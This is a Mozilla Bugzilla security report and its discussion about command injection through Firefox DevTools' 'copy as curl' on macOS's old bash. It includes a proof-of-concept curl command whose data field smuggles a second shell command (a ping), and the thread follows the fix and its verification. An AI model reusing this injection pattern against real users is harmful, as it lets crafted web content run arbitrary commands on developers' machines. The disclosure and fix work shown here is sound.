The problem that mac uses old bash, and there is lack of some updates. And current mac version of bash has a problem with bash history expansions.
Our bash command will be actually interpreted interesting if some of our previous commands contained 'ls'. So we will have such request:
curl '<https://google.com/>' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: \*/\*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'content-type: text/plain;charset=UTF-8' -H 'origin: null' -H 'DNT: 1' -H 'Connection: keep-alive' --data $'\'';ping 8.8.8.8;''
Interesting part is here:
$'\'';ping 8.8.8.8;''
So you see that here our string transformed into executable bash code.
WHATS HAPPEN
First of all when I found this, I asked to fix it bash team, but they told me that it is not a vulnerability at all, so there is no CVE, and that it is fixed in newer bash (it is true), and they won't fix it for old versions.
Okay, I sent this information to Apple, and they fixed it... But I was slow and didn't check there fix. But later I checked fix. And the fix was strange... They fixed Safari inspector. So it looks like Apple actually doesn't think that it is a problem in Bash as I inderstand.
So I am sending report to Firefox team.
VERSION
Works only in MacOS in any version of Firefox.
REPRODUCTION CASE
I attached archieve with video showcase and HTML file.Flags: sec-bounty?

|  | [potatoe](/user_profile?user_id=631135)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a442_631135)• 6 years ago |

Flags: needinfo?(watashiwaher)

|  | [potatoe](/user_profile?user_id=631135)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a450_631135)• 6 years ago |

Flags: needinfo?(watashiwaher)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1518026#c1)• 6 years ago |
|  | |

Thanks for this report.
Does this also work in Chrome's devtools, and did you report to them (if so, can you provide the URL)? Do you know if there is a (public or private) URL for the safari/mac "fix"?
Honza, are you the right person to look at this?Component: Security → NetmonitorFlags: needinfo?(watashiwaher)Flags: needinfo?(odvarko)Product: Firefox → DevTools

|  | [potatoe](/user_profile?user_id=631135)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1518026#c2)• 6 years ago |
|  | |

"Does this also work in Chrome's devtools, and did you report to them"
Yes it works, but I made report yesterday for both: Firefox and Chrome. So it is not public yet.
"Do you know if there is a (public or private) URL for the safari/mac "fix"?"
For Safari:
<https://support.apple.com/en-us/HT208324>
WebKit Web Inspector
Available for: OS X El Capitan 10.11.6, macOS Sierra 10.12.6, and macOS High Sierra 10.13.2
Impact: Processing maliciously crafted web content may lead to arbitrary code execution
Description: A command injection issue existed in Web Inspector. This issue was addressed through improved escaping of special characters.
[CVE-2017-7161](https://www.cve.org/CVERecord?id=CVE-2017-7161): Mitin Svyat
I looked at fix (sorry for too late). In Safari interesting part transformes in:
$'\'\041ls:q:gs|ls|;ping 8.8.8.8;|'Flags: needinfo?(watashiwaher)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1518026#c3)• 6 years ago |
|  | |

(In reply to potatoe from [comment #2](/show_bug.cgi?id=1518026#c2 "VERIFIED FIXED - RCE via \"copy as curl\" on mac"))
> "Does this also work in Chrome's devtools, and did you report to them"
> Yes it works, but I made report yesterday for both: Firefox and Chrome. So
> it is not public yet.
OK, can you provide the link for completeness? We may be able to coordinate with Chrome, though if the fix for Safari is already public it might not matter very much anymore...

|  | [potatoe](/user_profile?user_id=631135)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1518026#c4)• 6 years ago |
|  | |

Here is a link (but it is private now).
<https://bugs.chromium.org/p/chromium/issues/detail?id=919356>

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a350516_1689)• 6 years ago |

Status: UNCONFIRMED → NEWEver confirmed: trueKeywords: [csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-vector](/buglist.cgi?keywords=sec-vector&resolution=---)See Also: → <https://bugs.chromium.org/p/chromium/issues/detail?id=919356>

|  | [Brian Grinstead [:bgrins]](/user_profile?user_id=476442)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1518026#c5)• 6 years ago |
|  | |

I'm assuming this was the fix in Web Inspector: <https://github.com/WebKit/webkit/commit/5736bda9ad07609ef386e2d5a7f5308c17b98586>.

I can't find any reference to a commit from <https://support.apple.com/en-us/HT208324>, or a commit with the the CVE ID.

|  | [Brian Grinstead [:bgrins]](/user_profile?user_id=476442)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1518026#c6)• 6 years ago |
|  | |

Scanning our netmonitor code for "copy as curl", this looks like the relevant function: <https://searchfox.org/mozilla-central/rev/b29663c6c9c61b0bf29e8add490cbd6bad293a67/devtools/client/shared/curl.js#348>

|  | [Brian Grinstead [:bgrins]](/user_profile?user_id=476442)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1518026#c7)• 6 years ago |
|  | |

Attached file
[Bug 1518026 - Escape '!' to '\041' in posix strings ($'...');r=Honza](attachment.cgi?id=9036477)
— [Details](attachment.cgi?id=9036477&action=edit)

|  | [Brian Grinstead [:bgrins]](/user_profile?user_id=476442)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1518026#c8)• 6 years ago |
|  | |

I've ported over the WebInspector fix in [attachment 9036477](/attachment.cgi?id=9036477 "Bug 1518026 - Escape '!' to '\041' in posix strings ($'...');r=Honza") [[details]](/attachment.cgi?id=9036477&action=edit "Bug 1518026 - Escape '!' to '\041' in posix strings ($'...');r=Honza")

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1518026#c9)• 6 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/10d517464fb1ba1ea73ddcaea039e32f4f4116f6>

<https://hg.mozilla.org/mozilla-central/rev/10d517464fb1>

Group: firefox-core-security → core-security-releaseStatus: NEW → RESOLVEDClosed: 6 years ago
[status-firefox66](/buglist.cgi?f1=cf_status_firefox66&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → Firefox 66

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1518026#c10)• 6 years ago |
|  | |

Too late for Fx65 in light of tomorrow's RC gtb. Let's let this ride the trains with 66.

Assignee: nobody → bgrinstead
[status-firefox64](/buglist.cgi?f1=cf_status_firefox64&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox64&o1=equals&v1=wontfix)
[status-firefox65](/buglist.cgi?f1=cf_status_firefox65&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox65&o1=equals&v1=wontfix)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=affected)Flags: in-testsuite+

|  | [Jan Honza Odvarko [:Honza] (always need-info? me)](/user_profile?user_id=303767) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a1632832_303767)• 6 years ago |

Flags: needinfo?(odvarko)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a1903662_1689)• 6 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Bogdan Maris, Desktop Test Engineering](/user_profile?user_id=458188) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a3937895_458188)• 6 years ago |

Flags: qe-verify+Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]]

|  | [Emil Ghitta, QA [:emilghitta]](/user_profile?user_id=588744) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1518026#c11)• 6 years ago |
|  | |

I have managed to reproduce the issue mentioned in [comment 0](/show_bug.cgi?id=1518026#c0 "VERIFIED FIXED - RCE via \"copy as curl\" on mac") using Firefox 65.0.1 (BuildId:20190211233335).

This issue is verified fixed using Firefox 66.0b9 (BuildId:20190218131312) on macOS 10.12.6

Status: RESOLVED → VERIFIED
[status-firefox66](/buglist.cgi?f1=cf_status_firefox66&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=verified)Flags: qe-verify+

|  | [Brian Grinstead [:bgrins]](/user_profile?user_id=476442)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1518026#c12)• 6 years ago |
|  | |

Daniel, do you think we should uplift this to ESR for the 60.6 release?

Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1518026#c13)• 6 years ago |
|  | |

I don't feed strongly about it. It's a simple fix that release-drivers would probably take, but how many people are doing web development on ESR, let alone on ESR on mac?

Flags: needinfo?(dveditz)

|  | [Brian Grinstead [:bgrins]](/user_profile?user_id=476442)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1518026#c14)• 6 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #13](/show_bug.cgi?id=1518026#c13 "VERIFIED FIXED - RCE via \"copy as curl\" on mac"))

> I don't feed strongly about it. It's a simple fix that release-drivers would probably take, but how many people are doing web development on ESR, let alone on ESR on mac?

That's a good point. Given that this is DevTools + OSX only, I'm leaning towards not taking the resources required to get this uplifted and tested onto 60.

[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a5815533_280903)• 6 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]][adv-main66+]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a5827975_280903)• 6 years ago |

Alias: CVE-2019-9804

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1518026#c15)• 6 years ago |
|  | |

Is the report to Bash in a public report somewhere? I'd like to link to it.

Flags: needinfo?(watashiwaher)

|  | [potatoe](/user_profile?user_id=631135)  Reporter |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1518026#c16)• 6 years ago |
|  | |

Seems like noooo.

Flags: needinfo?(watashiwaher)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a34560395_578488)• 5 years ago |

See Also: → [CVE-2020-6811](/show_bug.cgi?id=1607742 "RESOLVED FIXED - 'Copy As Curl' in the network panel of the devtools does not escape the HTTP method properly, leading to local code execution")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a39367635_1689)• 5 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1518026#a170291539_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1518026&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [potatoe](/user_profile?user_id=631135)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


